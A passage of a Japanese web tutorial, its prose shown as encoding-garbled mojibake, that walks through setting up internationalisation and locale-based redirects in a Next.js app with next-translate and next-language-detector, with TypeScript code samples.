<p>ã¾ãšã¯<code class="language-text">next-translate</code>ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">`npm i next-translate`</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ«ãƒ¼ãƒˆãƒ¬ãƒ™ãƒ«ã«<code class="language-text">i18n.ts</code>ã¾ãŸã¯<code class="language-text">.js</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> I18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next-translate"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> i18nConfig <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">locales</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"en"</span><span class="token punctuation">,</span> <span class="token string">"es"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token literal-property property">defaultLocale</span><span class="token operator">:</span> <span class="token string">"en"</span><span class="token punctuation">,</span>
  <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token literal-property property">pages</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"*"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"common"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">defaultNS</span><span class="token operator">:</span> <span class="token string">"common"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span> satisfies I18nConfig<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚ŒãŒi18nã®ãŸã‚ã®åŸºæœ¬æ§‹æˆã«ãªã‚Šã¾ã™ã€‚å¿…è¦ã«å¿œã˜ã¦è‡ªç”±ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã—ã¦ã„ãŸã ã„ã¦æ§‹ã„ã¾ã›ã‚“ã€‚</p>
<p>æ¬¡ã«ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ«ãƒ¼ãƒˆãƒ¬ãƒ™ãƒ«ã«<code class="language-text">locales</code>ãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚©ãƒ«ãƒ€ã«ã¯ã€å„è¨€èªã®ç¿»è¨³ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fjd3m1r3xvj6jfr9tq1o5.png"></p>
<p><code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®<code class="language-text">_app.ts</code>ãƒ•ã‚¡ã‚¤ãƒ«ã«ç§»å‹•ã—ã€<code class="language-text">I18nProvider</code>ã§<code class="language-text">Component</code>ã‚’ãƒ©ãƒƒãƒ—ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token string">"@/styles/globals.css"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">type</span> <span class="token punctuation">{</span> AppProps <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/app"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> I18nProvider <span class="token keyword">from</span> <span class="token string">"next-translate/I18nProvider"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> commonES <span class="token keyword">from</span> <span class="token string">"../../locales/es/common.json"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> commonEN <span class="token keyword">from</span> <span class="token string">"../../locales/en/common.json"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">App</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> Component<span class="token punctuation">,</span> pageProps<span class="token punctuation">,</span> router <span class="token punctuation">}</span><span class="token operator">:</span> AppProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> lang <span class="token operator">=</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">)</span>
    <span class="token operator">?</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span>
    <span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">I18nProvider</span></span>
      <span class="token attr-name">lang</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>lang<span class="token punctuation">}</span></span>
      <span class="token attr-name">namespaces</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">common</span><span class="token operator">:</span> lang <span class="token operator">===</span> <span class="token string">"es"</span> <span class="token operator">?</span> commonES <span class="token operator">:</span> commonEN <span class="token punctuation">}</span><span class="token punctuation">}</span></span>
    <span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Component</span></span> <span class="token spread"><span class="token punctuation">{</span><span class="token operator">...</span>pageProps<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">I18nProvider</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®æ‰‹é †ã§ã¯ä»¥ä¸‹ã‚’è¡Œã„ã¾ã—ãŸã€‚</p>
<ul>
<li><code class="language-text">I18nProvider</code>ã§<code class="language-text">Component</code>ã‚’ãƒ©ãƒƒãƒ—ã™ã‚‹ã€‚</li>
<li>localeã¨ã„ã†ã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ã‚¿ã«æŒ‡å®šã•ã‚ŒãŸæ–‡å­—åˆ—ã‹ã‚‰è¨€èªã‚’æ¤œå‡ºã—ã€propsã¨ã—ã¦<code class="language-text">I18nProvider</code>ã«æ¸¡ã™ã€‚</li>
<li>ãã®è¨€èªã‚’åŸºã«åå‰ç©ºé–“ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®šç¾©ã™ã‚‹ã€‚</li>
</ul>
<p>æ¬¡ã«ã€<code class="language-text">src/hooks</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«<code class="language-text">useI18n.ts</code>ã¨ã„ã†åå‰ã®ã‚«ã‚¹ã‚¿ãƒ ãƒ•ãƒƒã‚¯ã‚’ä½œæˆã—ã€ãã“ã«æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> useTranslation <span class="token keyword">from</span> <span class="token string">"next-translate/useTranslation"</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">IUseI18n</span> <span class="token punctuation">{</span>
  namespace<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useI18n</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> namespace <span class="token punctuation">}</span><span class="token operator">:</span> IUseI18n <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useTranslation</span><span class="token punctuation">(</span>namespace <span class="token operator">?</span> namespace <span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultNS<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®ãƒ•ãƒƒã‚¯ã¯ã€è¨­å®šã•ã‚ŒãŸåå‰ç©ºé–“ã¾ãŸã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åå‰ç©ºé–“ã‚’ã‚‚ã¨ã«ç¿»è¨³ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚</p>
<p>æ¬¡ã«ã€<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®<code class="language-text">index.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ãã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useI18n <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/hooks/useI18n"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useI18n</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string">"greeting"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãã†ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªæ–‡å­—ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fg0x5w90losm7f8ozuzas.png"></p>
<p>ã€ŒHurrahï¼ˆã‚„ã£ãŸï¼ï¼‰ã€ç„¡äº‹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«i18nã‚’è¨­å®šã§ãã¾ã—ãŸã€‚ã—ã‹ã—ã€è¨€èªæ¤œå‡ºãŒã¾ã æ®‹ã£ã¦ã„ã¾ã™ã€‚æ¬¡ã¯ãã®éƒ¨åˆ†ã‚’å®Ÿè£…ã—ã¾ã—ã‚‡ã†ã€‚</p>
<h2>è¨€èªæ¤œå‡º</h2>
<p>å…ˆã»ã©è¦‹ãŸã‚ˆã†ã«ã€ãƒ­ã‚±ãƒ¼ãƒ«å€¤ã¯<code class="language-text">router.query</code>ã‹ã‚‰å–å¾—ã—ã¦ã„ã¾ã—ãŸã€‚
æ¬¡ã«é€²ã‚€ãŸã‚ã«ã€<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã«<code class="language-text">[locale]</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã¾ã™ã€‚
ãƒ«ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã¯å…¨ã¦ã“ã®ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«æ ¼ç´ã•ã‚Œã¾ã™ã€‚
<code class="language-text">[locale]</code>ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«<code class="language-text">index.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useI18n <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/hooks/useI18n"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">Home</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useI18n</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string">"greeting"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Home<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">localhost:3000/en</code>ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒè‹±èªã§è¡¨ç¤ºã•ã‚Œã€<code class="language-text">localhost:3000/es</code>ã«å¤‰ãˆã‚‹ã¨ã‚¹ãƒšã‚¤ãƒ³èªã§è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ãƒ«ãƒ¼ãƒˆã¨ã‚‚ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ã«çµ±åˆã—ã¾ã™ã€‚</p>
<p><code class="language-text">pages</code>ãƒ•ã‚©ãƒ«ãƒ€ã¯æ¬¡ã®ã‚ˆã†ãªæ§‹é€ ã«ãªã‚Šã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F39yib43wqcbuoymyrt4q.png"></p>
<p>ã§ã¯ã€<a href="https://www.npmjs.com/package/next-language-detector">next-language-detector</a>ã‚’ä½¿ç”¨ã—ã¦è¨€èªæ¤œå‡ºæ©Ÿèƒ½ã‚’å®Ÿè£…ã—ã€é¸æŠã—ãŸè¨€èªã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã—ã¾ã—ã‚‡ã†ã€‚
ã¾ãšã¯next-language-detectorã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">npm i next-language-detector</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><code class="language-text">src</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«<code class="language-text">lib</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã€ãã®ä¸­ã«<code class="language-text">languageDetector.ts</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ãã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> nextLanguageDetector <span class="token keyword">from</span> <span class="token string">"next-language-detector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> languageDetector <span class="token operator">=</span> <span class="token function">nextLanguageDetector</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  supportedLngs<span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">,</span>
  fallbackLng<span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>åŒã˜<code class="language-text">lib</code>ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«<code class="language-text">redirect.tsx</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"./languageDetector"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useRedirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span>to<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> redirectPath <span class="token operator">=</span> to <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>

  <span class="token comment">// language detection</span>
  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>redirectPath<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// prevent endless loop</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> router<span class="token punctuation">.</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> redirectPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>æ¬¡ã«ã€<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ä¸­ï¼ˆ<code class="language-text">[locale]</code>ãƒ•ã‚©ãƒ«ãƒ€ã®å¤–ï¼‰ã«ã‚ã‚‹<code class="language-text">index.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ãã€æ—¢å­˜ã®ã‚³ãƒ¼ãƒ‰ã‚’æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã«ç½®ãæ›ãˆã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRedirect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/redirect"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">Redirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token function">useRedirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Redirect<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã§ã€ãƒ­ã‚±ãƒ¼ãƒ«ã‚’æŒ‡å®šã›ãšã«ãƒ›ãƒ¼ãƒ ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãƒ­ã‚±ãƒ¼ãƒ«ãƒšãƒ¼ã‚¸ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€<code class="language-text">[locale]</code>ãƒ•ã‚©ãƒ«ãƒ€å†…ã®å…¨ã¦ã®ãƒ«ãƒ¼ãƒˆã«ã¤ã„ã¦ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆãƒšãƒ¼ã‚¸ã‚’ä½œæˆã™ã‚‹ã®ã¯ã‚ã¾ã‚ŠåŠ¹ç‡çš„ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒè¨€èªã‚’æŒ‡å®šã›ãšã«ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã—ãŸå ´åˆã«ç‰¹å®šè¨€èªã®ãƒ«ãƒ¼ãƒˆã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹LanguageWrapperã‚’ä½œæˆã—ã¾ã™ã€‚</p>
<p>ã¾ãšã¯<code class="language-text">src</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ä¸­ã«<code class="language-text">wrappers</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«<code class="language-text">LanguageWrapper.tsx</code>ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> ReactNode<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LanguageWrapperProps</span> <span class="token punctuation">{</span>
